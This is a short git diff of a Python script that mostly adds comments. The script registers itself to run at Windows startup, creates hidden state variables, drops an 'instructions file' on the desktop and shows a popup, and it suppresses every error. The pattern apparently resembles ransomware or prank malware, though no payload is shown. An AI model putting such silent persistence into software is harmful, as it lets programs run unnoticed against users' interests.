@@ -8,16 +8,10 @@ from finals import *
 import os
 import ctypes
 import pathlib
-import pathlib
 import shutil
 
 prog_call = Path(__file__).absolute()
 prog_call = r'%s' % str(prog_call).replace('\\', '/')
-prog_location = os.path.split(prog_call)[0]
-
-
-f = pathlib.Path(__file__).parent.absolute().parent
-
 
 """add batch file to startup. replace in the future"""
 def add_to_startup(file_path=""):
@@ -61,20 +55,20 @@ def create_vars_folder():
         pass
 
 try:
-    add_to_startup()
+    add_to_startup()  # add the main exe to startup
 except:
     pass
 try:
-    create_vars_folder()
-    create_var(final.active_field, 0)
+    create_vars_folder()  # create the vars folder in the parent of startup folder
+    create_var(final.active_field, 0)  # create the relevant vars
     create_var(final.msg_field, "")
 except:
     create_vars_folder()
     create_var(final.active_field, 0)
     create_var(final.msg_field, "")
 try:
-    createDesktopFolder()
-    popup()
+    createDesktopFolder()  # create the instructions file
+    popup()  # create a popup
 except:
     pass
 
